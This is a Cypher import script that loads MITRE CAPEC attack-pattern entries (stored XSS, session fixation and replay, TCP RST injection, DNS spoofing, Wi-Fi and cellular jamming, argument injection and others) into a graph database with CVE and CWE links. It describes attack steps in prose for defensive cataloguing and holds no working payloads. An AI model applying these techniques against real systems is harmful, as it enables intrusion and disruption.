MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2017-04-15"});
CREATE (:Description{id: 528, summary: "OrderedDict([('Text', \"This type of attack is a form of Cross-site Scripting (XSS) where a malicious script is persistenly “stored” within the data storage of a vulnerable web application. Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.\")])"});
CREATE (:CVE{id: "CVE-2002-1808", description: "<div level=\"0\">\n  <p class=\"text\">Cross-site scripting (XSS) vulnerability in Meunity Community System 1.1 allows remote attackers to inject arbitrary web script or HTML via Javascript in an IMG tag when creating a topic.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2006-6919", description: "<div level=\"0\">\n  <p class=\"text\">Firefox Sage extension 1.3.8 and earlier allows remote attackers to execute arbitrary Javascript in the local context via an RSS feed with an img tag containing the script followed by an extra trailing \">\", which Sage modifies to close the img element before the malicious script.</p>\n</div>"});
MERGE (:CWE{id: 79});
MERGE (:CWE{id: 20});
CREATE (:ResourcesRequired{id: 244, text: "<div level=\"0\">\n  <p class=\"text\">No specialized hardware or software resources are required to launch this type of attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 593, name: "Session Hijacking", status: "Stable", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 447, text: "<div level=\"0\">\n  <p class=\"text\">An application that leverages sessions to perform authentication.</p>\n</div>"});
CREATE (:Submission{id: 535});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2017-04-15"});
CREATE (:Description{id: 529, summary: "OrderedDict([('Text', \"This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.\")])"});
MERGE (:CWE{id: 287});
CREATE (:ResourcesRequired{id: 245, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must have the ability to communicate with the application over the network.</p>\n</div>"});
CREATE (:AttackPattern{id: 594, name: "Traffic Injection", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 448, text: "<div level=\"0\">\n  <p class=\"text\">The target application must leverage an open communications channel.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 449, text: "<div level=\"0\">\n  <p class=\"text\">The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).</p>\n</div>"});
CREATE (:Submission{id: 536});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-03"});
CREATE (:Modification{id: 331});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required"});
CREATE (:Description{id: 530, summary: "OrderedDict([('Text', \"An adversary injects traffic into the target's network connection. The adversary is therefore able to degrade or disrupt the connection, and potentially modify the content. This is not a flooding attack, as the adversary is not focusing on exhausting resources. Instead, the adversary is crafting a specific input to affect the system in a particular way.\")])"});
CREATE (:ResourcesRequired{id: 246, text: "<div level=\"0\">\n  <p class=\"text\">A tool, such as a MITM Proxy, that is capable of generating and injecting custom inputs to be used in the attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 595, name: "Connection Reset", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 450, text: "<div level=\"0\">\n  <p class=\"text\">This attack requires the ability to monitor the target's network connection.</p>\n</div>"});
CREATE (:Submission{id: 537});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-04"});
CREATE (:Description{id: 531, summary: "OrderedDict([('Text', \"In this attack pattern, an adversary injects a connection reset packet to one or both ends of a target's connection. The attacker is therefore able to have the target and/or the destination server sever the connection without having to directly filter the traffic between them.\")])"});
CREATE (:AttackPattern{id: 596, name: "TCP RST Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 451, text: "<div level=\"0\">\n  <p class=\"text\">An On/In Path Device</p>\n</div>"});
CREATE (:Submission{id: 538});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-03"});
CREATE (:Description{id: 532, summary: "OrderedDict([('Text', 'An adversary injects one or more TCP RST packets to a target after the target has made a HTTP GET request. The goal of this attack is to have the target and/or destination web server terminate the TCP connection.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.41.1", author: "['John-Paul Verkamp', 'Minaxi Gupta']", title: "Inferring Mechanics of Web Censorship Around the World", publisher: "USENIX", pubdate: "2012"});
CREATE (:AttackPattern{id: 597, name: "Absolute Path Traversal", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 452, text: "<div level=\"0\">\n  <p class=\"text\">The target must leverage and access an underlying file system.</p>\n</div>"});
CREATE (:Submission{id: 539});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2017-01-06"});
CREATE (:Description{id: 533, summary: "OrderedDict([('Text', 'An adversary with access to file system resources, either directly or via application logic, will use various file absolute paths and navigation mechanisms such as \"..\" to extend their range of access to inappropriate areas of the file system. The goal of the adversary is to access directories and files that are intended to be restricted from their access.')])"});
CREATE (:CVE{id: "CVE-2002-1345", description: "<div level=\"0\">\n  <p class=\"text\">Multiple FTP clients write arbitrary files via absolute paths in server responses</p>\n</div>"});
CREATE (:CVE{id: "CVE-2000-0614", description: "<div level=\"0\">\n  <p class=\"text\">Arbitrary files may be overwritten via compressed attachments that specify absolute path names for the decompressed output.</p>\n</div>"});
MERGE (:CWE{id: 36});
CREATE (:ResourcesRequired{id: 247, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results.</p>\n</div>"});
CREATE (:AttackPattern{id: 598, name: "DNS Spoofing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 453, text: "<div level=\"0\">\n  <p class=\"text\">On/In Path Device</p>\n</div>"});
CREATE (:Submission{id: 540});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-04"});
CREATE (:Description{id: 534, summary: "OrderedDict([('Text', 'An adversary sends a malicious (\"NXDOMAIN\" (\"No such domain\") code, or DNS A record) response to a targets route request before a legitimate resolver can. This technique requires an On-path or In-path device that can monitor and respond to the targets DNS requests. This attack differs from BGP Tampering in that it directly responds to requests made by the target instead of polluting the routing the targets infrastructure uses.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.41.1", author: "['John-Paul Verkamp', 'Minaxi Gupta']", title: "Inferring Mechanics of Web Censorship Around the World", publisher: "USENIX", pubdate: "2012"});
MERGE (:Reference{id: "REF-2", local_id: "R.41.1", author: "Anonymous", title: "Towards a Comprehensive Picture of the Great Firewall's DNS Censorship", publisher: "USENIX", pubdate: "2014"});
CREATE (:AttackPattern{id: 599, name: "Terrestrial Jamming", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 541});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-12"});
CREATE (:Description{id: 535, summary: "OrderedDict([('Text', 'In this attack pattern, the adversary transmits disruptive signals in the direction of the target consumer-level satellite dish (as opposed to the satellite itself). The transmission disruption occurs in a more targeted range. Portable terrestrial jammers have a range of 3-5 kilometers in urban areas and 20 kilometers in rural areas. This technique requires a terrestrial jammer that is more powerful than the frequencies sent from the satellite.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.17.1", author: "Small Media", title: "Satellite Jamming in Iran: A War over Airwaves", pubdate: "November 2012"});
CREATE (:ResourcesRequired{id: 249, text: "<div level=\"0\">\n  <p class=\"text\">A terrestrial satellite jammer with a signal more powerful than that of the satellite attempting to communicate with the target.</p>\n  <p class=\"text\">The adversary must know the location of the target satellite dish.</p>\n</div>"});
CREATE (:AttackPattern{id: 6, name: "Argument Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 454, text: "<div level=\"0\">\n  <p class=\"text\">Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 455, text: "<div level=\"0\">\n  <p class=\"text\">Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client.</p>\n</div>"});
CREATE (:Submission{id: 542});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 536, summary: "OrderedDict([('Text', 'An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Discovery of potential injection vectors", description: "<div level=\"0\">\n  <p class=\"text\">Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Manually cover the application and record the possible places where arguments could be passed into external systems.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a spider, for web applications, to create a list of URLs and associated inputs.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Arguments are used by the application in exposed services or methods</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Application does not use any inputs.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of parameters, arguments to modify is identified."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of URLs, with their corresponding parameters (POST, GET, COOKIE, etc.) is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "1. Attempt variations on argument content", description: "<div level=\"0\">\n  <p class=\"text\">Possibly using an automated tool, the attacker will perform injection variations of the arguments.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results, error messages and/or log if accessible.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application behaves like the injection has been a success.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No result appears.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Failure", description: "It is possible to monitor the application and to see that the argument has been validated."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Abuse of the application", description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Manually inject specific payload into targeted argument.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker observes desired effect."});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Detective"});
MERGE (:Reference{id: "REF-2", local_id: "R.6.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{local_id: "R.6.2", author: "Jouko Pynnonen", title: "Java Web Start argument injection vulnerability", link: "http://www.securityfocus.com/archive/1/393696"});
MERGE (:CWE{id: 77});
MERGE (:CWE{id: 146});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 78});
MERGE (:CWE{id: 185});
MERGE (:CWE{id: 713});
MERGE (:CWE{id: 697});
CREATE (:ResourcesRequired{id: 250, text: "<div level=\"0\">\n  <p class=\"text\">Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</p>\n</div>"});
CREATE (:AttackPattern{id: 60, name: "Reusing Session IDs (aka Session Replay)", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 456, text: "<div level=\"0\">\n  <p class=\"text\">The target host uses session IDs to keep track of the users.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 457, text: "<div level=\"0\">\n  <p class=\"text\">Session IDs are used to control access to resources.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 458, text: "<div level=\"0\">\n  <p class=\"text\">The session IDs used by the target host are not well protected from session theft.</p>\n</div>"});
CREATE (:Submission{id: 543});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 332});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 537, summary: "OrderedDict([('Text', 'This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker interacts with the target host and finds that session IDs are used to authenticate users.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker steals a session ID from a valid user.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID's original owner.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.60.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 294});
MERGE (:CWE{id: 290});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 384});
MERGE (:CWE{id: 488});
MERGE (:CWE{id: 539});
MERGE (:CWE{id: 200});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 664});
MERGE (:CWE{id: 732});
CREATE (:AttackPattern{id: 601, name: "Jamming", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 544});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 333});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Description Summary, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 538, summary: "OrderedDict([('Text', 'An adversary uses radio noise or signals in an attempt to disrupt communications. By intentionally overwhelming system resources with illegitimate traffic, service is denied to the legitimate traffic of authorized users.')])"});
CREATE (:AttackPattern{id: 602, name: "DEPRECATED: Degradation", status: "Deprecated", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 545});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 334});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 94, name: "Degradation"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 539, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated.')])"});
CREATE (:AttackPattern{id: 603, name: "Blockage", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 546});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 540, summary: "OrderedDict([('Text', 'An adversary blocks the delivery of an important system resource causing the system to fail or stop working.')])"});
CREATE (:AttackPattern{id: 604, name: "Wi-Fi Jamming", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 459, text: "<div level=\"0\">\n  <p class=\"text\">Lack of anti-jam features in 802.11</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 460, text: "<div level=\"0\">\n  <p class=\"text\">Lack of authentication on deauthentication/disassociation packets on 802.11-based networks</p>\n</div>"});
CREATE (:Submission{id: 547});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 541, summary: "OrderedDict([('Text', 'In this attack scenario, the attacker actively transmits on the Wi-Fi channel to prevent users from transmitting or receiving data from the targeted Wi-Fi network. There are several known techniques to perform this attack – for example: the attacker may flood the Wi-Fi access point (e.g. the retransmission device) with deauthentication frames. Another method is to transmit high levels of noise on the RF band used by the Wi-Fi network.')])"});
CREATE (:AttackPattern{id: 605, name: "Cellular Jamming", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 461, text: "<div level=\"0\">\n  <p class=\"text\">Lack of anti-jam features in cellular technology (2G, 3G, 4G, LTE)</p>\n</div>"});
CREATE (:Submission{id: 548});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 542, summary: "OrderedDict([('Text', 'In this attack scenario, the attacker actively transmits signals to overpower and disrupt the communication between a cellular user device and a cell tower. Several existing techniques are known in the open literature for this attack for 2G, 3G, and 4G LTE cellular technology. For example, some attacks target cell towers by overwhelming them with false status messages, while others introduce high levels of noise on signaling channels.')])"});
CREATE (:AttackPattern{id: 606, name: "Weakening of Cellular Encryption", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 462, text: "<div level=\"0\">\n  <p class=\"text\">Cellular devices that allow negotiating security modes to facilitate backwards compatibility and roaming on legacy networks.</p>\n</div>"});
CREATE (:Submission{id: 549});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 543, summary: "OrderedDict([('Text', 'An attacker, with control of a Cellular Rogue Base Station or through cooperation with a Malicious Mobile Network Operator can force the mobile device (e.g., the retransmission device) to use no encryption (A5/0 mode) or to use easily breakable encryption (A5/1 or A5/2 mode).')])"});
MERGE (:CWE{id: 757});
CREATE (:AttackPattern{id: 607, name: "Obstruction", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 550});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 544, summary: "OrderedDict([('Text', 'An attacker obstructs the interactions between system components. By interrupting or disabling these interactions, an adversary can often force the system into a degraded state or even a failure more.')])"});
CREATE (:AttackPattern{id: 608, name: "Cryptanalysis of Cellular Encryption", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 463, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 551});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 545, summary: "OrderedDict([('Text', 'The use of cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption to reveal traffic content. Some cellular encryption algorithms such as A5/1 and A5/2 (specified for GSM use) are known to be vulnerable to such attacks and commercial tools are available to execute these attacks and decrypt mobile phone conversations in real-time. Newer encryption algorithms in use by UMTS and LTE are stronger and currently believed to be less vulnerable to these types of attacks. Note, however, that an attacker with a Cellular Rogue Base Station can force the use of weak cellular encryption even by newer mobile devices.')])"});
MERGE (:CWE{id: 327});
CREATE (:AttackPattern{id: 609, name: "Cellular Traffic Intercept", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 464, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 552});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 335});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 546, summary: "OrderedDict([('Text', 'Cellular traffic for voice and data from mobile devices and retransmission devices can be intercepted via numerous methods. Malicious actors can deploy their own cellular tower equipment and intercept cellular traffic surreptitiously. Additionally, government agencies of adversaries and malicious actors can intercept cellular traffic via the telecommunications backbone over which mobile traffic is transmitted.')])"});
CREATE (:AttackPattern{id: 61, name: "Session Fixation", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 465, text: "<div level=\"0\">\n  <p class=\"text\">Session identifiers that remain unchanged when the privilege levels change.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 466, text: "<div level=\"0\">\n  <p class=\"text\">Permissive session management mechanism that accepts random user-generated session identifiers</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 467, text: "<div level=\"0\">\n  <p class=\"text\">Predictable session identifiers</p>\n</div>"});
CREATE (:Submission{id: 553});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 336});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 547, summary: "OrderedDict([('Text', 'The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Setup the Attack", description: "<div level=\"0\">\n  <p class=\"text\">Setup a session: The attacker has to setup a trap session that provides a valid session identifier, or select an arbitrary identifier, depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker chooses a predefined identifier that he knows.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker creates a trap session for the victim.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application accepts predefined, or user-provided session IDs</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The application ignores predefined, or user-provided session IDs and provides new session IDs.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A trap session or a predefined session ID is established."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attract a Victim", description: "<div level=\"0\">\n  <p class=\"text\">Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim's browser. This is known as fixating the session. The session identifier can be introduced into the victim's browser by leveraging cross site scripting vulnerability, using META tags or setting HTTP response headers in a variety of ways.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attackers can put links on web sites (such as forums, blogs, or comment forms).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Attackers can email attack URLs to potential victims through spam and phishing techniques.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A victim makes a connection according to the attackers' design."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Abuse the Victim's Session", description: "<div level=\"0\">\n  <p class=\"text\">Takeover the fixated session: Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the fixated session identifier.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker loads the predefined session ID into his browser and browses to protected data or functionality.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker loads the predefined session ID into his software and utilizes functionality with the rights of the victim.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gains access to data or functionality with the rights of the victim."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Corrective"});
MERGE (:Reference{id: "REF-2", local_id: "R.61.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.61.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-384 - Session Fixation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/384.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.61.3", title: "Common Weakness Enumeration (CWE)", section: "CWE-361 - Time and State", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/361.html"});
MERGE (:CWE{id: 384});
MERGE (:CWE{id: 361});
MERGE (:CWE{id: 664});
MERGE (:CWE{id: 732});
CREATE (:ResourcesRequired{id: 252, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 610, name: "Cellular Data Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 468, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 554});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 548, summary: "OrderedDict([('Text', 'Adversaries inject data into mobile technology traffic (data flows or signaling data) to disrupt communications or conduct additional surveillance operations.')])"});
CREATE (:AttackPattern{id: 611, name: "BitSquatting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 469, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 555});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 549, summary: "OrderedDict([('Text', 'Bitsquatting refers to the registration of a domain names one bit different than a popular domain. A bitsquatting attack leverages random errors in memory to direct Internet traffic to attacker-controlled destinations. Bitsquatting requires no exploitation or complicated reverse engineering, and is operating system and architecture agnostic. Experimental observations show that bitsquatting popular websites could redirect non-trivial amounts of Internet traffic to a malicious entity.')])"});
MERGE (:Reference{local_id: "R.611.1", author: "Artem Dinaburg", title: "Bitsquatting: DNS Hijacking without exploitation", publisher: "Raytheon", link: "http://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf"});
CREATE (:AttackPattern{id: 612, name: "WiFi MAC Address Tracking", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 470, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 556});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
